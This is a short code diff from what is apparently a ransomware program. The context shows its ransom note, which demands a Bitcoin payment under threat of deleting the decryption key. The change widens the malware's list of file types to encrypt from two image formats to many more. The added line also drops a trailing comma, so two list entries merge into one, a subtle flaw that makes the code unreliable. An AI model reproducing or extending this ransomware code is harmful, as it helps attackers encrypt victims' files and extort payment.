@@ -39,13 +39,12 @@ To acquire this key, transfer the Bitcoin Fee to the specified wallet address be
 If you fail to take action within this time window, the decryption key will be destroyed and access to your files will be permanently lost."""
 
 ## DEFAULT FILETYPES TO ENCRYPT
-# The default list of filetypes which can be encrypted
 ENCRYPTABLE_FILETYPES = [
     # GENERAL FORMATS
     "sln",
 
     # IMAGE FORMATS
-    "jpg", "png",
+    "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp", "svg"
 
     # VIDEO FORMATS
     "mp4", "avi", "mkv",
